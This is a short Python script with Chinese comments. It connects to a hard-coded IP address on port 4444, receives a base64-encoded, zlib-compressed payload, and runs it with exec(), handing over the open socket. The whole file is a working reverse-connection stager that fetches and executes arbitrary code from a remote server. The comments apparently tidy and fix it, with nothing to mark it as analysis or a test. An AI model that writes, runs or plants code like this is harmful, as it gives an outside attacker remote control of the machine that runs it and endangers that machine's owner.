import base64
import logging
import socket
import struct
import time
import zlib

# 建议使用配置文件或命令行参数传入
SERVER_IP = '81.69.250.247'
SERVER_PORT = 4444

def connect_to_server():
    """
    尝试连接到服务器。
    """
    for attempt in range(3):  # 尝试连接的最大次数
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 修正socket创建方式
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except Exception as e:
            logging.error(f"连接到服务器失败：{e}")
            time.sleep(5)
    raise Exception("连接服务器尝试失败。")

def receive_and_execute(s):
    try:
        l = struct.unpack('>I', s.recv(4))[0]
        d = s.recv(l)
        while len(d) < l:
            d += s.recv(l - len(d))
        compressed_data = zlib.decompress(base64.b64decode(d))
        result = exec(compressed_data, {'s': s})
        return result
    except Exception as e:
        logging.error(f"接收或执行数据时出错：{e}")
        return None

if __name__ == "__main__":
    s = connect_to_server()
    if s:
        result = receive_and_execute(s)
        print(result)
        s.close()

